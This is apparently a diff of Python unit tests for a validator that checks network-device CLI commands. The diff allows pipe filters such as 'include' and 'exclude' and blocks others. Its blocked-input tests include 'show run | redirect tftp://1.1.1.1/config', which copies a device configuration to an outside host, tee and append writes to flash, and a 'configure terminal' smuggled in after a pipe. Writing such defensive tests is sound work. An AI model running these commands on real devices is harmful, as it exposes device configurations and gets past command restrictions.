@@ -33,15 +33,47 @@ class NeExecValidationTests(unittest.TestCase):
                     _validate_command(cmd)
                 self.assertEqual(ctx.exception.detail, "command_not_allowed_prefix")
 
-    def test_blocks_pipe(self) -> None:
-        with self.assertRaises(HTTPException) as ctx:
-            _validate_command("show run | include hostname")
-        self.assertEqual(ctx.exception.status_code, 400)
-        self.assertEqual(ctx.exception.detail, "command_chars_not_allowed")
+    def test_allows_pipe_filter_subcommands(self) -> None:
+        for cmd in (
+            "show run | include hostname",
+            "show configuration | include hostname",
+            "display current-configuration | include sysname",
+            "show run | exclude ^!",
+            "show run | begin interface",
+            "show run | section ^router",
+            "show ip route | count",
+            "show run | match hostname",
+            "show run | grep hostname",
+            "show run | one-line",
+            "show run | include x | include y",
+        ):
+            with self.subTest(cmd=cmd):
+                _validate_command(cmd)
+
+    def test_blocks_pipe_redirect_and_unknown(self) -> None:
+        for cmd in (
+            "show run | redirect tftp://1.1.1.1/config",
+            "show run | append flash:cfg.txt",
+            "show run | tee flash:cfg.txt",
+            "show run | send log",
+            "show run | unknown-filter x",
+            "show run |",
+            "show run | | include x",
+        ):
+            with self.subTest(cmd=cmd):
+                with self.assertRaises(HTTPException) as ctx:
+                    _validate_command(cmd)
+                self.assertEqual(ctx.exception.status_code, 400)
+                self.assertEqual(ctx.exception.detail, "command_pipe_not_allowed")
 
     def test_blocks_configure(self) -> None:
         with self.assertRaises(HTTPException):
             _validate_command("configure terminal")
+
+    def test_blocks_configure_after_pipe(self) -> None:
+        with self.assertRaises(HTTPException) as ctx:
+            _validate_command("show run | configure terminal")
+        self.assertEqual(ctx.exception.detail, "command_blocked")
 
     def test_blocks_non_show_prefix(self) -> None:
         with self.assertRaises(HTTPException) as ctx:
